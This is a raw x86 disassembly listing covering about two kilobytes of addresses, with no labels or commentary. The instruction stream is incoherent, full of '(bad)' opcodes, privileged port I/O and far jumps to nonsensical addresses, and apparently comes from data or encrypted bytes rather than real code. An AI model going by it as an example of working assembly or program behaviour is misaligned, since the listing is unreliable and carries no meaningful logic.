  402269:	inc    eax
  40226a:	int    0xb2
  40226c:	sub    al,0x45
  40226e:	sbb    cl,0x91
  402271:	or     ecx,ebp
  402273:	push   0x89bc4ac6
  402278:	mov    cs,esi
  40227a:	xchg   edx,eax
  40227b:	sub    eax,0xd3eab582
  402280:	inc    esp
  402281:	ja     0x40227e
  402283:	xchg   edi,eax
  402284:	fs push ebp
  402286:	outs   dx,DWORD PTR ds:[esi]
  402287:	inc    ecx
  402288:	mov    ds:0x50b80823,eax
  40228d:	mov    esi,0x81a66994
  402292:	mov    bh,0xc
  402294:	bnd jno 0x40225e
  402297:	bound  esp,QWORD PTR [ebx-0x49]
  40229a:	push   es
  40229b:	push   0xe
  40229d:	mul    esp
  40229f:	xchg   esi,eax
  4022a0:	aam    0x53
  4022a2:	outs   dx,BYTE PTR ds:[esi]
  4022a3:	xor    eax,0xf98b575
  4022a8:	mov    ebp,0xb2f0fd53
  4022ad:	popf   
  4022ae:	jge    0xc77599e8
  4022b4:	jg     0x4022ef
  4022b6:	xchg   BYTE PTR [eax],dl
  4022b8:	add    eax,0x9828b0a4
  4022bd:	fadd   QWORD PTR [eax]
  4022bf:	mov    ebp,0x9d2e8352
  4022c4:	fldenv [edi-0x41]
  4022c7:	dec    edi
  4022c8:	xchg   ecx,eax
  4022c9:	mov    eax,ds:0x344fb1cc
  4022ce:	xlat   BYTE PTR ds:[ebx]
  4022cf:	ins    DWORD PTR es:[edi],dx
  4022d0:	jb     0x402347
  4022d2:	push   cs
  4022d3:	mov    dl,0x85
  4022d5:	ror    bh,1
  4022d7:	inc    eax
  4022d8:	xor    DWORD PTR [edx+0x1eac490a],edi
  4022de:	mov    ds:0xd3c3da1e,al
  4022e3:	test   BYTE PTR [edx+0x4c],al
  4022e6:	jmp    0x5f9f6fc6
  4022eb:	outs   dx,DWORD PTR ds:[esi]
  4022ec:	add    eax,0x86d22324
  4022f1:	sahf   
  4022f2:	(bad)  
  4022f3:	cmp    edi,DWORD PTR [edx+eax*8-0x43]
  4022f7:	push   0xffffffee
  4022f9:	cli    
  4022fa:	xor    eax,0x5a5c48a1
  4022ff:	scas   eax,DWORD PTR es:[edi]
  402300:	sbb    eax,0xd3aeee69
  402305:	repz or dh,BYTE PTR ds:[edx-0x3f2d0ffe]
  40230d:	adc    DWORD PTR [esi+0x32],ebx
  402310:	jp     0x40234e
  402312:	js     0x402362
  402314:	pop    ebp
  402315:	pop    ds
  402316:	inc    eax
  402317:	jbe    0x40229b
  402319:	in     eax,0x34
  40231b:	cmp    BYTE PTR [ebp+0x4518cbfa],bl
  402321:	mov    dh,BYTE PTR [edx+0x59e34233]
  402327:	into   
  402328:	pop    edi
  402329:	retf   0xb215
  40232c:	xchg   ebp,eax
  40232d:	(bad)  [esi+0x8]
  402330:	sahf   
  402331:	pop    es
  402332:	ss js  0x4022ef
  402335:	jae    0x402333
  402337:	push   0x34
  402339:	test   eax,0x7cd95e7d
  40233e:	xchg   ebx,eax
  40233f:	mov    ebx,0xfa2b7674
  402344:	sahf   
  402345:	inc    edx
  402346:	jne    0x402308
  402348:	add    ebx,DWORD PTR [edx-0x59243dbe]
  40234e:	sub    BYTE PTR [ecx+0x32],al
  402351:	aad    0xf1
  402353:	adc    ecx,DWORD PTR [ecx]
  402355:	jae    0x402398
  402357:	mov    DWORD PTR [esi+0x1268d8b3],eax
  40235d:	jns    0x40234a
  40235f:	xor    eax,0x632234ca
  402364:	imul   eax,DWORD PTR [ebx],0xfffffff3
  402367:	shr    bh,cl
  402369:	sub    bh,ch
  40236b:	mov    ah,cl
  40236d:	outs   dx,BYTE PTR ds:[esi]
  40236e:	xchg   esi,eax
  40236f:	pop    es
  402370:	loop   0x402398
  402372:	std    
  402373:	cmp    esi,edx
  402375:	cld    
  402376:	pushw  0x26
  402379:	xor    al,0xc5
  40237b:	fwait
  40237c:	xor    cl,BYTE PTR [esi+0x200df102]
  402382:	daa    
  402383:	bound  eax,QWORD PTR [ecx-0x45]
  402386:	cmc    
  402387:	enter  0x1d55,0xde
  40238b:	xlat   BYTE PTR ds:[ebx]
  40238c:	(bad)  
  40238d:	retf   0x9052
  402390:	pop    es
  402391:	jg     0x4023db
  402393:	push   eax
  402394:	fsubrp st(7),st
  402396:	mov    dh,BYTE PTR [ecx+0x71de6439]
  40239c:	imul   ebp,DWORD PTR [esi+0x0],0x1dc32091
  4023a3:	or     ah,al
  4023a5:	sahf   
  4023a6:	cli    
  4023a7:	jne    0x4023f0
  4023a9:	or     al,0x66
  4023ab:	cld    
  4023ac:	inc    BYTE PTR [edi-0x3e28a72d]
  4023b2:	aad    0x9c
  4023b4:	sub    al,0x4e
  4023b6:	inc    edx
  4023b7:	sub    eax,0x65a69c5c
  4023bc:	push   ecx
  4023bd:	das    
  4023be:	(bad)  
  4023bf:	adc    ecx,DWORD PTR fs:[edi-0x3a4923b8]
  4023c6:	(bad)  [edx-0x63f23296]
  4023cc:	test   BYTE PTR [ecx],bl
  4023ce:	jbe    0x402390
  4023d0:	mov    ds:0x9f137577,eax
  4023d5:	push   ebx
  4023d6:	inc    edx
  4023d7:	mov    ds:0x9ac00fdb,eax
  4023dc:	in     eax,dx
  4023dd:	in     eax,0x45
  4023df:	mov    ebp,0x8684678a
  4023e4:	fwait
  4023e5:	push   esp
  4023e6:	test   BYTE PTR [edx+0x49f07d73],dl
  4023ec:	sar    BYTE PTR [edi+ebx*4+0x39ba0742],1
  4023f3:	ret    0xd2d7
  4023f6:	jmp    0x13440726
  4023fb:	push   cs
  4023fc:	push   ds
  4023fd:	mov    ch,0x26
  4023ff:	mov    ebx,cs
  402401:	test   BYTE PTR ds:0xcdb24f6f,al
  402407:	cdq    
  402408:	stos   BYTE PTR es:[edi],al
  402409:	pushf  
  40240a:	into   
  40240b:	mov    bl,0xbf
  40240d:	lods   eax,DWORD PTR ds:[esi]
  40240e:	pop    edi
  40240f:	es lahf 
  402411:	cmp    ebp,DWORD PTR [edx-0x46b7e5ae]
  402417:	adc    eax,0xd225d300
  40241c:	fsubr  QWORD PTR [esi-0x15be73e6]
  402422:	sbb    ch,BYTE PTR [edx-0x1d203039]
  402428:	push   ss
  402429:	out    0x7d,al
  40242b:	push   ecx
  40242c:	bound  eax,QWORD PTR ds:0x182deedd
  402432:	dec    edi
  402433:	mov    ds:0x42384ee2,al
  402438:	push   0x5f77c243
  40243d:	lods   eax,DWORD PTR ds:[esi]
  40243e:	jns    0x402440
  402440:	xchg   edi,eax
  402441:	or     esp,ecx
  402443:	out    0x1c,al
  402445:	jmp    0x8428:0xf6d570d2
  40244c:	xchg   BYTE PTR [ebp+0x14792470],dl
  402452:	test   al,0x49
  402454:	push   ds
  402455:	jns    0x4023ec
  402457:	sti    
  402458:	adc    edx,DWORD PTR [ecx+0x2fc7b1fb]
  40245e:	jns    0x4024df
  402460:	test   BYTE PTR [edx+ecx*2],bl
  402463:	int    0x6d
  402465:	xor    BYTE PTR [esp+ecx*2],al
  402468:	xchg   ebx,eax
  402469:	cs xchg ebx,eax
  40246b:	idiv   dh
  40246d:	inc    ebp
  40246e:	xchg   edi,eax
  40246f:	sbb    DWORD PTR [esp+edx*2],esi
  402472:	mov    esp,0x2d725c1c
  402477:	in     eax,dx
  402478:	push   cs
  402479:	pop    edi
  40247a:	enter  0xfcce,0xb3
  40247e:	mov    DWORD PTR [ebp-0x66],ebp
  402481:	sbb    DWORD PTR [ebp-0x40],edi
  402484:	jns    0x402475
  402486:	sbb    eax,DWORD PTR [ebp-0x3aa88ccd]
  40248c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40248d:	adc    edi,ebx
  40248f:	add    al,0x20
  402491:	cmc    
  402492:	mov    dl,0x2f
  402494:	mov    dh,0x3a
  402496:	adc    BYTE PTR [esi+ecx*4-0x567a2665],ch
  40249d:	mov    ds:0x3eb4575a,eax
  4024a2:	test   bh,cl
  4024a4:	je     0x4024c0
  4024a6:	shr    BYTE PTR [ebx-0x54],1
  4024a9:	adc    BYTE PTR [edx-0x3],al
  4024ac:	jle    0xae81bcd4
  4024b2:	mov    edx,0xb765783a
  4024b7:	cs cs adc esp,ebx
  4024bb:	in     al,0x16
  4024bd:	jmp    0x402536
  4024bf:	aad    0xf1
  4024c1:	ds retf 
  4024c3:	in     eax,dx
  4024c4:	pop    ebp
  4024c5:	inc    ebp
  4024c6:	jb     0x402454
  4024c8:	out    0x40,eax
  4024ca:	je     0x4024e7
  4024cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024cd:	sbb    DWORD PTR [ebx-0x5b],ecx
  4024d0:	mov    bh,0x3b
  4024d2:	push   edx
  4024d3:	retf   0x6ccb
  4024d6:	or     dh,BYTE PTR [ebx]
  4024d8:	in     eax,dx
  4024d9:	jecxz  0x4024d9
  4024db:	mov    al,0x7c
  4024dd:	or     DWORD PTR [ebp-0xa],0x35
  4024e1:	inc    edx
  4024e2:	jbe    0x40252a
  4024e4:	test   DWORD PTR [ebp+eiz*4-0x14],edx
  4024e8:	xchg   esp,eax
  4024e9:	out    dx,eax
  4024ea:	sbb    al,0x6d
  4024ec:	pop    ss
  4024ed:	in     eax,0xfd
  4024ef:	out    0x1a,eax
  4024f1:	retf   0xb1c7
  4024f4:	push   ebp
  4024f5:	jl     0x4024da
  4024f7:	mov    ds:0x4423594,al
  4024fc:	ds xchg ebp,eax
  4024fe:	sti    
  4024ff:	xchg   ebx,eax
  402500:	jno    0x40253e
  402502:	fbstp  TBYTE PTR ds:0x79e0d1c0
  402508:	test   BYTE PTR [esi],ah
  40250a:	outs   dx,BYTE PTR ds:[esi]
  40250b:	mov    dh,0xff
  40250d:	stc    
  40250e:	(bad)  
  40250f:	mov    esi,0x48d0bfb9
  402514:	cmp    eax,0x85bebae9
  402519:	test   DWORD PTR [esi+0x442345a],edi
  40251f:	nop
  402520:	cli    
  402521:	not    BYTE PTR [ecx]
  402523:	inc    eax
  402524:	aaa    
  402525:	push   0x16168cf6
  40252a:	cmc    
  40252b:	ret    
  40252c:	fimul  WORD PTR [ecx+0x4a]
  40252f:	out    dx,eax
  402530:	imul   ebp,DWORD PTR ds:0xd3836a69,0xffffffb7
  402537:	dec    esp
  402538:	(bad)  
  402539:	and    al,0x71
  40253b:	jecxz  0x4024cb
  40253d:	jae    0x4024f3
  40253f:	xlat   BYTE PTR ds:[ebx]
  402540:	rol    ecx,cl
  402542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402543:	repz push eax
  402545:	mov    esi,DWORD PTR [edi+0x14]
  402548:	rol    DWORD PTR [ecx],1
  40254a:	arpl   bp,ax
  40254c:	call   0x7b6f:0xf75c7e20
  402553:	and    esp,DWORD PTR [ecx]
  402555:	sbb    BYTE PTR [edx-0x6e1d7d61],0xf7
  40255c:	in     al,dx
  40255d:	cmp    bh,BYTE PTR [eax+0x2a]
  402560:	int3   
  402561:	icebp  
  402562:	jns    0x40252c
  402564:	fist   WORD PTR [ecx+0xb]
  402567:	loopne 0x40250b
  402569:	xchg   BYTE PTR [ebp+0x77],cl
  40256c:	pop    ecx
  40256d:	int3   
  40256e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40256f:	repnz jecxz 0x40259e
  402572:	xchg   ebp,eax
  402573:	sbb    esp,0xd519150d
  402579:	cs add eax,0xffffff95
  40257d:	mov    esp,0x2345008d
  402582:	out    0xf1,al
  402584:	jno    0x4025da
  402586:	arpl   WORD PTR [esi+0x7c],ax
  402589:	test   eax,0x72610b9d
  40258e:	mov    edi,0x53f389d
  402593:	adc    al,0x7e
  402595:	push   cs
  402596:	sbb    cl,BYTE PTR [eax+0x7f43a880]
  40259c:	push   es
  40259d:	outs   dx,BYTE PTR ds:[esi]
  40259e:	icebp  
  40259f:	dec    eax
  4025a0:	inc    edi
  4025a1:	ja     0x4025b9
  4025a3:	lock add BYTE PTR [edi-0x25],bh
  4025a7:	or     al,0xb5
  4025a9:	and    al,0x49
  4025ab:	mov    esp,0x33b790be
  4025b0:	mov    esp,DWORD PTR [esp+ecx*4-0x742594d5]
  4025b7:	push   ds
  4025b8:	jns    0x4025d1
  4025ba:	mov    bl,dh
  4025bc:	test   BYTE PTR [edx-0x55e25795],cl
  4025c2:	es inc edi
  4025c4:	xchg   ebp,eax
  4025c5:	test   DWORD PTR ds:0x37c584c0,0xb86c3e2
  4025cf:	into   
  4025d0:	pop    ebp
  4025d1:	sbb    cl,BYTE PTR [ecx]
  4025d3:	and    al,0xdd
  4025d5:	(bad)  
  4025d6:	imul   edx,DWORD PTR [eax+0x71],0xffffff8e
  4025da:	jbe    0x402578
  4025dc:	and    DWORD PTR [ebx-0x57],ebp
  4025df:	add    bl,BYTE PTR [esi-0x74]
  4025e2:	cmp    ebp,0x7764267a
  4025e8:	out    0xc7,al
  4025ea:	xchg   esp,eax
  4025eb:	add    eax,0x2327e555
  4025f0:	sbb    al,0x98
  4025f2:	daa    
  4025f3:	pop    ds
  4025f4:	sbb    BYTE PTR fs:[ecx+0x3d51aa0d],dl
  4025fb:	mov    dh,0x72
  4025fd:	ins    DWORD PTR es:[edi],dx
  4025fe:	add    ecx,esi
  402600:	in     al,dx
  402601:	pop    ecx
  402602:	jl     0x4025d8
  402604:	inc    ebp
  402605:	xlat   BYTE PTR ds:[ebx]
  402606:	jge    0x40265d
  402608:	jno    0x4025bd
  40260a:	mov    edi,DWORD PTR [esi+0x2933c67d]
  402610:	jne    0x402680
  402612:	test   DWORD PTR [edi],0x9eebd5a7
  402618:	arpl   WORD PTR [ebp-0x3e],bp
  40261b:	jg     0x402655
  40261d:	and    ebx,edi
  40261f:	dec    edi
  402620:	pop    ebx
  402621:	into   
  402622:	mov    BYTE PTR [edx-0x9],al
  402625:	xor    al,0x23
  402627:	rcr    DWORD PTR [edi+eax*8-0x666069cc],1
  40262e:	xchg   BYTE PTR [eax+ebp*4-0x2f501c45],cl
  402635:	int3   
  402636:	outs   dx,DWORD PTR ds:[esi]
  402637:	adc    al,0x70
  402639:	bound  ebx,QWORD PTR [ebx]
  40263b:	jmp    0x4026aa
  40263d:	mov    ah,BYTE PTR [ebx+0x47435c90]
  402643:	mov    ebx,0x56c739a8
  402648:	test   al,0xf2
  40264a:	pop    ds
  40264b:	mov    ebx,0xa81ab9de
  402650:	adc    BYTE PTR ss:[ecx+0x4f98990f],ch
  402657:	mov    cl,0x15
  402659:	sbb    al,0x40
  40265b:	mov    ch,0xf0
  40265d:	add    ebp,esi
  40265f:	gs iret 
  402661:	dec    eax
  402662:	add    eax,0x414637af
  402667:	sbb    al,0x28
  402669:	popa   
  40266a:	or     eax,DWORD PTR [esi]
  40266c:	imul   ebp,ecx,0xffffffb3
  40266f:	mov    edi,0xf64b0cc0
  402674:	and    esp,DWORD PTR [esi]
  402676:	mov    ebp,0x2d0147a6
  40267b:	jno    0x402610
  40267d:	mov    edx,0xa6087974
  402682:	pusha  
  402683:	int    0x94
  402685:	push   edi
  402686:	not    BYTE PTR [ebp-0x7825a9e4]
  40268c:	pop    edi
  40268d:	ins    DWORD PTR es:[edi],dx
  40268e:	dec    edi
  40268f:	sbb    BYTE PTR [ecx],al
  402691:	test   al,dh
  402693:	clc    
  402694:	ficomp DWORD PTR [edx]
  402696:	stos   DWORD PTR es:[edi],eax
  402697:	mov    al,0x5e
  402699:	fscale 
  40269b:	xor    al,0xc2
  40269d:	in     al,0xc2
  40269f:	shr    BYTE PTR [ebp-0x6],1
  4026a2:	outs   dx,DWORD PTR ds:[esi]
  4026a3:	std    
  4026a4:	stc    
  4026a5:	test   eax,0x8d113fac
  4026aa:	jmp    0x4026fc
  4026ac:	inc    esi
  4026ad:	mov    dh,0x61
  4026af:	lods   al,BYTE PTR ds:[esi]
  4026b0:	mov    DWORD PTR [eax+eax*2-0x2554ce50],esp
  4026b7:	inc    esp
  4026b8:	in     al,0x8a
  4026ba:	adc    DWORD PTR [ebx-0x63],0x822c51c0
  4026c1:	mov    esp,0x632a1e2e
  4026c6:	in     eax,dx
  4026c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c8:	push   cs
  4026c9:	rcl    ebx,0x21
  4026cc:	out    0x5d,al
  4026ce:	imul   ebp,esi,0x37
  4026d1:	xor    ebx,ebp
  4026d3:	xor    cl,BYTE PTR [edi]
  4026d5:	pop    ecx
  4026d6:	pop    ss
  4026d7:	(bad)  
  4026d8:	in     eax,0xee
  4026da:	push   esp
  4026db:	jge    0x40270a
  4026dd:	mov    ecx,0xe0b98d22
  4026e2:	mov    ds:0x16bff675,eax
  4026e7:	pop    ecx
  4026e8:	imul   edx,DWORD PTR [edi+ebp*2],0x11
  4026ec:	add    al,bl
  4026ee:	jmp    0x40273a
  4026f0:	adc    BYTE PTR [esi-0xf9b51ba],cl
  4026f6:	dec    eax
  4026f7:	pop    ebx
  4026f8:	ins    BYTE PTR es:[edi],dx
  4026f9:	mov    ss,esp
  4026fb:	push   eax
  4026fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026fd:	(bad)  
  4026ff:	mov    ebp,ebp
  402701:	push   0xffffffb5
  402703:	inc    ebx
  402704:	xchg   edx,eax
  402705:	sbb    al,0xae
  402707:	nop
  402708:	mov    ecx,0x35e1f2e8
  40270d:	add    ecx,ecx
  40270f:	dec    esi
  402710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402711:	jo     0x402777
  402713:	js     0x402728
  402715:	add    bl,BYTE PTR [ecx+0x2a]
  402718:	sub    eax,0x300195f7
  40271d:	fst    QWORD PTR [ebx+0x1a3f723f]
  402723:	in     al,0x10
  402725:	test   DWORD PTR [ecx+0x69b45d1c],ecx
  40272b:	inc    edx
  40272c:	push   eax
  40272d:	or     BYTE PTR [edx+0x4ec09927],0x4e
  402734:	inc    esp
  402735:	or     al,0x6
  402737:	and    dh,BYTE PTR [edi+0xa]
  40273a:	mov    ch,BYTE PTR [ebp+0x60faa5dc]
  402740:	mov    edx,0x884a4ea6
  402745:	jg     0x40270f
  402747:	adc    ebx,ebp
  402749:	mov    ch,0x8f
  40274b:	jl     0x402720
  40274d:	inc    ecx
  40274e:	pop    edi
  40274f:	mov    fs,WORD PTR [esi]
  402751:	pop    ebx
  402752:	xor    al,0xc2
  402754:	jne    0x40274d
  402756:	mov    ebp,0xc7aa752e
  40275b:	das    
  40275c:	mov    ds:0xcd88fc46,al
  402761:	out    0x66,al
  402763:	retf   
  402764:	add    ch,BYTE PTR [eax]
  402766:	and    al,0x97
  402768:	mov    cl,0xc
  40276a:	or     ecx,ecx
  40276c:	mov    eax,ds:0x37c196f1
  402771:	jecxz  0x402733
  402773:	aad    0x79
  402775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402776:	mov    ebp,esp
  402778:	mov    ah,0x1
  40277a:	idiv   DWORD PTR [ebx+0x67]
  40277d:	push   es
  40277e:	inc    ebx
  40277f:	ret    
  402780:	cmc    
  402781:	mov    esi,0x4614a927
  402786:	retf   0xf579
  402789:	popa   
  40278a:	xchg   DWORD PTR [esi+0x40ea6916],ebx
  402790:	sbb    eax,0xefe3ce46
  402795:	dec    ecx
  402796:	into   
  402797:	lods   al,BYTE PTR ds:[esi]
  402798:	pop    ecx
  402799:	xchg   BYTE PTR [ecx+edi*1],cl
  40279c:	xor    BYTE PTR [ebx-0x167b33e3],bh
  4027a2:	aaa    
  4027a3:	jno    0x402807
  4027a5:	in     al,0xc
  4027a7:	adc    edi,DWORD PTR [edi+0x3e23be4]
  4027ad:	sbb    eax,0x999ea651
  4027b2:	test   DWORD PTR [esi+eax*8-0x12],eax
  4027b6:	sbb    BYTE PTR [edi],ch
  4027b8:	call   0x1c93c137
  4027bd:	ror    cl,cl
  4027bf:	imul   DWORD PTR [edx+0x8b32a6c]
  4027c5:	or     esp,DWORD PTR [ebp+eax*8-0x63b6f3a9]
  4027cc:	sbb    BYTE PTR [ebp-0x4e725dfc],bl
  4027d2:	lahf   
  4027d3:	popa   
  4027d4:	out    dx,eax
  4027d5:	jbe    0x402839
  4027d7:	popa   
  4027d8:	mov    edi,0x44b2f06a
  4027dd:	mov    al,0x1f
  4027df:	or     ah,BYTE PTR [edx]
  4027e1:	ss scas al,BYTE PTR es:[edi]
  4027e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e4:	addr16 ss inc eax
  4027e7:	mov    ebp,0xbb4f670a
  4027ec:	push   ebp
  4027ed:	lods   eax,DWORD PTR ds:[esi]
  4027ee:	gs mov esp,0xd145e0c
  4027f4:	add    eax,0xff65b124
  4027f9:	xor    dl,bh
  4027fb:	wbinvd 
  4027fd:	dec    ebp
  4027fe:	mov    ch,0x8a
  402800:	mov    ah,0x39
  402802:	pusha  
  402803:	stc    
  402804:	jno    0x402805
  402806:	sub    BYTE PTR [esi+0x704fd8ae],bl
  40280c:	dec    ebp
  40280d:	neg    BYTE PTR [eax+0x11]
  402810:	aam    0xc5
  402812:	inc    edi
  402813:	call   0x663b:0x48ac2ca5
  40281a:	xchg   bh,al
  40281c:	lock xor ah,dl
  40281f:	xchg   ebp,eax
  402820:	jmp    0x4027a4
  402822:	add    edi,DWORD PTR [ebx+0x697c2fa]
  402828:	add    BYTE PTR ds:0x378c72d7,0xe8
  40282f:	adc    eax,ebp
  402831:	mul    ebp
  402833:	add    BYTE PTR [esi],ch
  402835:	cwde   
  402836:	xchg   BYTE PTR [edx-0x4a],ch
  402839:	popa   
  40283a:	inc    ebx
  40283b:	xor    BYTE PTR [esi],0x33
  40283e:	fnstenv [ebx+0xd]
  402841:	cli    
  402842:	jle    0x402818
  402844:	not    DWORD PTR [edi-0x3a]
  402847:	addr16 jbe 0x402896
  40284a:	jge    0x4027f6
  40284c:	dec    esp
  40284d:	popa   
  40284e:	inc    esp
  40284f:	sbb    BYTE PTR [edx+edi*1-0x679807ff],al
  402856:	sub    dl,dl
  402858:	aaa    
  402859:	and    ebx,DWORD PTR [edx]
  40285b:	add    eax,0x5b2b2807
  402860:	pop    ebx
  402861:	or     al,0xed
  402863:	scas   eax,DWORD PTR es:[edi]
  402864:	jns    0x402832
  402866:	adc    al,BYTE PTR [edx+0x1d]
  402869:	scas   eax,DWORD PTR es:[edi]
  40286a:	push   ebp
  40286b:	mov    dh,0x6d
  40286d:	pop    esi
  40286e:	mov    ds:0xfe43c781,eax
  402873:	and    BYTE PTR [ebx],cl
  402875:	mov    bl,dl
  402877:	sti    
  402878:	sbb    BYTE PTR [ebx+0x61],dh
  40287b:	hlt    
  40287c:	rcr    DWORD PTR [esi],cl
  40287e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40287f:	jne    0x40283d
  402881:	(bad)  
  402882:	fadd   DWORD PTR [ecx]
  402884:	shl    esp,0x23
  402887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402888:	xchg   ebx,eax
  402889:	js     0x402840
  40288b:	mov    ah,0x30
  40288d:	call   0xc65d:0x3db56949
  402894:	and    eax,edx
  402896:	adc    BYTE PTR [eax-0x7f20b2c4],0xb8
  40289d:	add    esi,DWORD PTR [ebx+0x52bc72c8]
  4028a3:	push   ds
  4028a4:	addr16 bnd jmp 0x4028b8
  4028a8:	and    DWORD PTR [ebx-0xe],edi
  4028ab:	jmp    DWORD PTR [eax]
  4028ad:	scas   al,BYTE PTR es:[edi]
  4028ae:	mov    edi,0x1ef8f81a
  4028b3:	cmp    eax,0xc4b022e7
  4028b8:	pop    ss
  4028b9:	out    0x3f,al
  4028bb:	xor    ah,BYTE PTR [edx]
  4028bd:	je     0x4028a6
  4028bf:	aam    0x1
  4028c1:	adc    al,0xc2
  4028c3:	std    
  4028c4:	fstp   TBYTE PTR [edi]
  4028c6:	mov    bh,0x74
  4028c8:	bound  ebx,QWORD PTR [edi-0x3c]
  4028cb:	pusha  
  4028cc:	lds    edx,FWORD PTR [edi]
  4028ce:	mov    dl,0xc6
  4028d0:	(bad)  
  4028d1:	xchg   esp,eax
  4028d2:	xchg   edx,eax
  4028d3:	inc    eax
  4028d4:	aad    0x2e
  4028d6:	not    BYTE PTR [ebp+0x72]
  4028d9:	adc    eax,DWORD PTR ds:0x1d2d55b1
  4028df:	xchg   ebp,eax
  4028e0:	push   ebx
  4028e1:	in     eax,0x7d
  4028e3:	mov    bh,0x30
  4028e5:	test   eax,0x1e2b1dbb
  4028ea:	inc    esp
  4028eb:	aas    
  4028ec:	gs pop dx
  4028ef:	jo     0x402895
  4028f1:	pop    ebx
  4028f2:	ins    BYTE PTR es:[edi],dx
  4028f3:	mov    ecx,0x2e2aefd9
  4028f8:	les    ebp,FWORD PTR [ecx]
  4028fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028fb:	repz push edi
  4028fd:	cmp    DWORD PTR [edi+0x5c],edi
  402900:	mov    ds:0x145c1df1,al
  402905:	cmp    edi,DWORD PTR [ebp+0x3b168aa8]
  40290b:	dec    esp
  40290c:	sub    DWORD PTR [ecx-0x4a],0x2b9290dc
  402913:	cmp    eax,0x56b0f527
  402918:	adc    edx,DWORD PTR [ecx]
  40291a:	inc    ebp
  40291b:	mov    edx,0x229993fb
  402920:	into   
  402921:	jg     0x402960
  402923:	fstp   TBYTE PTR [edx-0x1af89a8f]
  402929:	repnz jmp 0xf71c:0x42e7225a
  402931:	in     al,0xbd
  402933:	or     edi,ecx
  402935:	and    eax,0x99d53bed
  40293a:	in     al,0x73
  40293c:	pop    esp
  40293d:	and    BYTE PTR [esi],ah
  40293f:	mov    dl,cl
  402941:	xor    BYTE PTR [esi-0x7],dh
  402944:	push   ebx
  402945:	jbe    0x402973
  402947:	xor    eax,0x16240733
  40294c:	stc    
  40294d:	jle    0x40290a
  40294f:	push   es
  402950:	cmp    BYTE PTR [edx+0x0],bl
  402953:	mov    edi,0xe4d32498
  402958:	mov    al,0x93
  40295a:	shr    BYTE PTR [ebp-0x4],1
  40295d:	or     al,0x14
  40295f:	mov    edx,0xfc3b54e0
  402964:	adc    dl,BYTE PTR cs:[edx-0x1e]
  402968:	mov    al,0x99
  40296a:	fisubr DWORD PTR [ecx-0x6c]
  40296d:	(bad)  
  40296e:	dec    edi
  40296f:	push   ecx
  402970:	mov    ds:0x3aad74ec,al
  402975:	push   edi
  402976:	pop    eax
  402977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402978:	push   eax
  402979:	stos   DWORD PTR es:[edi],eax
  40297a:	hlt    
  40297b:	adc    dl,BYTE PTR [edi]
  40297d:	or     BYTE PTR [edx-0x29],ch
  402980:	add    eax,0x6f50b14e
  402985:	dec    ebx
  402986:	repz mov WORD PTR [edx],fs
  402989:	dec    edi
  40298a:	adc    DWORD PTR [ecx],ebp
  40298c:	in     eax,0x9a
  40298e:	sub    DWORD PTR [ebx],esi
  402990:	and    eax,0x5e645bfe
  402995:	(bad)  
  402996:	mov    ebx,0xa283d9d5
  40299b:	cmp    edi,edx
  40299d:	cs call 0x48ab:0xf06a6a9e
  4029a5:	leave  
  4029a6:	pop    esp
  4029a7:	mov    ch,0xc1
  4029a9:	neg    BYTE PTR [edi+ebp*4]
  4029ac:	std    
  4029ad:	jmp    0xe198b5fa
  4029b2:	cmp    BYTE PTR [ebx+ecx*8],dh
  4029b5:	pop    esp
  4029b6:	push   cs
  4029b7:	cli    
  4029b8:	popa   
  4029b9:	dec    edx
  4029ba:	sahf   
  4029bb:	aas    
  4029bc:	cmpxchg BYTE PTR [ecx+0x23],ah
  4029c0:	rol    BYTE PTR [esi+0x47],cl
  4029c3:	iret   
  4029c4:	loop   0x4029b5
  4029c6:	inc    ebx
  4029c7:	sbb    dl,BYTE PTR [ebx+0x4d0da14d]
  4029cd:	(bad)  [ebx]
  4029cf:	ret    0x3641
  4029d2:	neg    DWORD PTR [ebx+0x971bd0a]
  4029d8:	pop    es
  4029d9:	inc    eax
  4029da:	mul    dh
  4029dc:	neg    BYTE PTR [ebx+0x6]
  4029df:	not    DWORD PTR [edi-0x30400033]
  4029e5:	jle    0x4029b6
  4029e7:	mov    dh,0x7d
  4029e9:	popa   
  4029ea:	push   ebp
  4029eb:	repnz push DWORD PTR es:[esi+0x6]
  4029f0:	jl     0x40299d
  4029f2:	das    
  4029f3:	imul   eax,DWORD PTR [ebx-0x70],0x35778101
  4029fa:	out    0x91,al
  4029fc:	or     al,0x2e
  4029fe:	repz mul DWORD PTR [ecx]
  402a01:	ret    
  402a02:	loop   0x4029c1
  402a04:	mov    dl,0x9f
  402a06:	cmp    DWORD PTR ds:0x43ebddef,ecx
  402a0c:	inc    eax
  402a0d:	pop    esp
  402a0e:	mov    bl,0xfd
  402a10:	out    dx,eax
  402a11:	pop    edx
  402a12:	inc    esi
  402a13:	inc    ecx
  402a14:	and    BYTE PTR [ebx+edi*4],bh
  402a17:	and    bh,BYTE PTR [edi+0x1c]
  402a1a:	xlat   BYTE PTR ds:[ebx]
  402a1b:	(bad)  
  402a1c:	mov    cl,0x58
  402a1e:	scas   eax,DWORD PTR es:[edi]
  402a1f:	mov    bl,0xa4
  402a21:	fdivr  QWORD PTR [ebp-0x5a]
  402a24:	les    edi,FWORD PTR [ecx-0x6aae302f]
  402a2a:	scas   al,BYTE PTR es:[edi]
  402a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a2c:	lahf   
  402a2d:	sti    
  402a2e:	loope  0x402a46
  402a30:	push   es
  402a31:	mov    ecx,0xdb739bf5
  402a36:	dec    edx
  402a37:	stos   BYTE PTR es:[edi],al
  402a38:	xor    bl,BYTE PTR [ebx+0x26ed76d4]
  402a3e:	in     eax,0x10
  402a40:	ins    DWORD PTR es:[edi],dx
  402a41:	mov    edx,0xe02517ff
  402a46:	or     BYTE PTR [ecx+0x66a5c3d6],dl
  402a4c:	pop    esi
